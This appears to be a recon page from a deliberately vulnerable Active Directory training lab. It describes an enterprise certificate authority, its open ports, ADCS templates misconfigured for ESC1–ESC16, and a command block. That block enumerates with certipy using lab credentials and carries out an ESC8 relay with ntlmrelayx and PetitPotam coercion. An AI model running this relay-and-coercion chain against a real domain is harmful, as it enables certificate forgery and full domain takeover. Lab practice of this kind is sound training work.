# ca01.corp.local — 10.10.0.12

Enterprise CA. Holds the templates that turn "domain user" into "Administrator with a TGT." Every ESC1..16 is reachable here.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 80 | TCP | IIS — ADCS Web Enrollment (`/certsrv`) | **HTTP only**, no EPA, NTLM + Basic ⇒ **ESC8** |
| 135 | TCP | RPC endpoint mapper | `ICertPassage` (ESC11 candidate) |
| 389/636 | TCP | LDAP (domain-joined) | |
| 445 | TCP | SMB | signing default |
| 3389 | TCP | RDP | |
| 5985 | TCP | WinRM | Ansible channel |

## ADCS templates published (the high-value ones)

| Template | Vuln | Why |
|---|---|---|
| `ESC1` | ESC1 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + Domain Users enroll + no manager approval |
| `ESC2` | ESC2 | "Any Purpose" EKU |
| `ESC3` | ESC3 | Enrollment Agent EKU + enroll-on-behalf-of |
| `ESC4` | ESC4 | Domain Users have `GenericAll` on the template object |
| `ESC6_Vulnerable` | ESC6 | CA-wide `EDITF_ATTRIBUTESUBJECTALTNAME2` accepts user-supplied SAN |
| `WebServer` (ESC8) | ESC8 | Domain Users enroll via web; combined with HTTP+NTLM = relay |
| `ESC9` | ESC9 | `CT_FLAG_NO_SECURITY_EXTENSION` (no user-SID extension) |
| `ESC10` | ESC10 | Strong cert binding loose (EditFlags 0x40000) |
| `ESC13` | ESC13 | Issuance policy OID linked to Domain Admins via `msDS-OIDToGroupLink` |
| `ESC14` | ESC14 | `developer1` has WriteProperty on `altSecurityIdentities` of Administrator |
| `ESC15` | ESC15 / CVE-2024-49019 | WebServer schema v1 enrollable by users (EKUwu) |

CA-wide: `DisableExtensionList` includes `1.3.6.1.4.1.311.25.2` → ESC16 (no SID extension on *any* issued cert).

## Web enrollment URLs to know

```
http://10.10.0.12/certsrv/                          # web enrollment portal (NTLM auth)
http://10.10.0.12/certsrv/certfnsh.asp              # request handler
http://10.10.0.12/ADPolicyProvider_CEP_*/service.svc/CEP   # CEP
http://10.10.0.12/corp-CA-CA_CES_*/service.svc/CES         # CES
```

## Minimum enum sweep

```bash
CA=10.10.0.12
nmap -p 80,135,389,445,3389,5985 -sV $CA
curl -sk http://$CA/certsrv/                                 # 401 NTLM
# Authenticated:
certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -stdout
# ESC8 path (no creds needed if you have coercion):
ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker 10.10.0.10
```

## Forward to

CRED-020 (PetitPotam → ADCS), CRED-024 (Certifried), DF-011..022 (ESC1..16), PER-023 (Golden Certificate after CA private key export).
